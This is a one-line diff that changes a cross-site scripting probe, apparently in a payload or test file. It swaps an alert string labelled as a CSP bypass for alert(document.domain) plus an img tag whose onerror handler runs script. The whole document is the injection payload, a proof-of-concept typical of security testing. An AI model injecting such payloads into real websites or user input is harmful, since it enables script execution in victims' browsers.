@@ -1,1 +1,1 @@
-alert('XSS_CSP_BYpass')
+alert(document.domain)//<img src="abc://" onerror=alert(document.domain)>
